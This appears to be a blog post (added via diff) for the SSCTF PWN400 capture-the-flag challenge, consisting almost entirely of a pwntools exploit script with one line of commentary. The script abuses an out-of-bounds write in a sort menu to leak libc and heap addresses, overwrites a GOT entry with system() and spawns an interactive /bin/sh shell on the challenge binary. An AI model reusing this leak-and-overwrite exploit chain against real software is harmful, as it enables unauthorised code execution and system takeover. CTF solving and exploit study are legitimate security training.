@@ -1,0 +1,230 @@
+---
+layout: default
+title: SSCTF PWN400
+---
+<h2>{{ page.title }}</h2>
+<p>最后剩5分钟才分配任意地址，最后写完了</p>
+<p>{{ page.date | date_to_string }}</p>
+
+{% highlight python %}
+from pwn import *
+import sys
+import re
+#context.log_level = 'DEBUG'
+#
+elf = ELF('./pwn1-fb39ccfa')
+
+r_libc = ELF('./libc.so')
+l_libc = ELF('/lib/i386-linux-gnu/libc-2.13.so')
+libc = l_libc
+
+
+def read_main(io):
+	io.recvuntil('_CMD_$')
+def read_sort(io):
+	io.recvuntil('Choose:')
+
+def sort_proc(io, numbers):
+	read_main(io)
+	io.send('sort'+'\n')
+
+	io.recvuntil('sort')
+
+	io.send(str(len(numbers ) ) + '\n')
+
+	for i in range(len(numbers)):
+		io.recvuntil('number:')
+		io.send(str(numbers[i]) + '\n')
+def pwn_proc(io, numbers):
+	read_main(io)
+	io.send('sort'+'\n')
+
+	io.recvuntil('sort')
+
+	io.send(str(len(numbers ) ) + '\n')
+
+
+	io.recvuntil('number:')
+	io.send(str(numbers[0]) + '\n')
+
+def sort_exit(io):
+	read_sort(io)
+
+	io.send('7'+ '\n')
+
+def sort_query(io, no):
+	read_sort(io)
+	io.send('1' + '\n')
+
+	io.recvuntil('index:')
+
+	io.send(str(no) + '\n')
+
+	io.recvuntil('result')
+
+
+def sort_update(io, no, value):
+	read_sort(io)
+	io.send('2' + '\n')
+
+	io.recvuntil('index:')
+
+	io.send(str(no) + '\n')
+
+	io.recvuntil('number:')
+
+	io.send(str(value) + '\n')
+
+def sort_do(io):
+	read_sort(io)
+	io.send('3'+'\n')
+
+
+def history_proc(io, until):
+	read_main(io)
+	io.send('history'+'\n')
+
+	return io.recvuntil(until)
+
+def reload_proc(io):
+	read_main(io)
+	io.send('reload'+'\n')
+
+def clear_proc(io):
+	read_main(io)
+	io.send('clear'+'\n')
+
+def test_update(io, arr):
+	sort_proc(io, arr)
+	sort_update(io, len(arr), 0x40089C)
+	sort_exit(io)
+
+def make_arr(size):
+	res = []
+	for i in range(size):
+		res.append(i + 1)
+	return res
+
+def reload_proc(io, no):
+	io.send('reload' + '\n')
+
+	io.recvuntil('ID')
+
+	io.send(str(no) + '\n')
+
+def ana_addr(his_str):
+	print '[+]his_str is ' + his_str
+	r = re.compile(r'Len = \-?\d*?,')
+	print r.findall(his_str)
+	num_str = r.findall(his_str)[0][5:-1]
+	if( ((int(num_str ) + 4294967295) % 4294967295) < 0x80000):
+		num_str = r.findall(his_str)[1][5:-1]
+	return ((int(num_str ) + 4294967295) % 4294967295)
+	
+
+def leak_addr(io):
+	GOT_ADDR =  0x804D000
+	MA_ADDR = 0x804d08c
+	sort_proc(io, [1,2,4,4,5,6,7])
+
+	sort_do(io)
+
+
+	sort_update(io, 7, GOT_ADDR)
+
+	sort_exit(io)
+
+	LIBC_ADDR = ana_addr(history_proc(io ,'Data') ) - 0x643d0
+
+	sort_proc(io, [1+7,2+7,3+7,4+7,5+7,6+7,7+7])
+
+	sort_do(io)
+
+	sort_update(io, 7, MA_ADDR)
+
+	sort_exit(io)
+
+
+	HEAP_ADDR = ana_addr(history_proc(io ,' 0 ') ) 
+
+	return (LIBC_ADDR, HEAP_ADDR)
+
+
+#print payload.encode('hex')
+#exit(0)
+#print rop.dump()
+
+#process('/bin/sh')
+#conn.recvline()
+#conn.send(cyclic(24)+p64(0x40089C)+payload)
+
+io = process('./pwn1-fb39ccfa')
+
+
+#pwnlib.gdb.attach(io, execute = open('./gdbshell' ) )
+for i in range(10):
+	sort_proc(io, [1,2,3,4,5,6,7])
+	sort_do(io)
+	sort_exit(io)
+
+clear_proc(io)
+
+basis_addr = leak_addr(io)	
+print '[+]LIBC:0x%x, HEAP:0x%x'%basis_addr
+
+
+libc_base = basis_addr[0] - 0xa6f
+heap_base = basis_addr[1]
+
+heap_0xff = heap_base + 0x164
+
+print '[+]heap_0xff is ' + hex(heap_base)
+
+
+sort_proc(io, [9,2,2147483647,1,5,6,7])
+
+sort_do(io)
+
+sort_update(io, 7, heap_0xff)
+
+sort_exit(io)
+
+reload_proc(io, 1)
+
+
+GOT_ADDR =  0x804D000
+
+sort_update(io, 16389+48, 72)
+sort_update(io, 16390+48, 0)
+sort_update(io, 16391+48, 0x804d004)
+#sort_update(io, 16392, 0)
+#sort_undate(io, 16401, )
+
+sort_exit(io)
+
+pwn_proc(io, [-1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17])
+
+system_addr = libc.symbols['system']
+
+print'\n\n\n[+]system_addr is 0x%x'%(system_addr+libc_base)
+
+
+
+sort_update(io, 6, system_addr+libc_base - 0x100000000)
+#update 6 to system addr & /bin/sh
+
+
+io.recvuntil('succeed!')
+
+io.send('/bin/sh' + '\n')
+
+#16389
+#16393
+#16397
+#16401
+
+
+
+io.interactive()
+
+{% endhighlight %}  
